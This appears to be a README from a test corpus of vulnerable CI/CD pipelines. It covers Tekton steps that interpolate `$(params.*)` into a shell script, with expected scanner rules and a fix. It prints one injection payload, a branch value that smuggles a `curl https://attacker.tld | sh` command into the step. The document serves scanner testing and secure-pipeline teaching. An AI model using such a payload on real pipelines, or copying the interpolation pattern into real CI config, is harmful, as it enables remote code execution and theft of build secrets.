# Scenario 71: Tekton — `$(params.*)` injected into a step script

**Provider:** Tekton · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`pipeline.yaml`](pipeline.yaml)

## The pattern

```yaml
steps:
  - name: build
    script: |
      echo "building $(params.branch)"
```

A Tekton step interpolates a `$(params.*)` value directly into its `script:`.
Task params can carry attacker-controlled values (a branch name, a PR title
passed through a Pipelines-as-Code trigger), so the param becomes shell syntax.

## How an attacker exploits it

A `branch` param set to `x"; curl https://attacker.tld | sh; #` executes that
command in the step. Tekton analogue of the expression-injection family
(scenarios 02 / 56 / 62).

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `TKN-003` — `$(params.*)` injected into step script |

> pipeline-check 1.9.0's `TKN-003` fires on the `$(params.*)` injection again (the earlier quoting carve-out was lifted), and `AC-023` corroborates the injection chain.

## Fix

Don't interpolate `$(params.*)` into `script:`. Bind the param to an `env:` var
on the step and reference it quoted (`"$BRANCH"`), or pass it as an argument to
a pinned program rather than building a shell string.

## References

- Tekton — Tasks (params, results, security): https://tekton.dev/docs/pipelines/tasks/
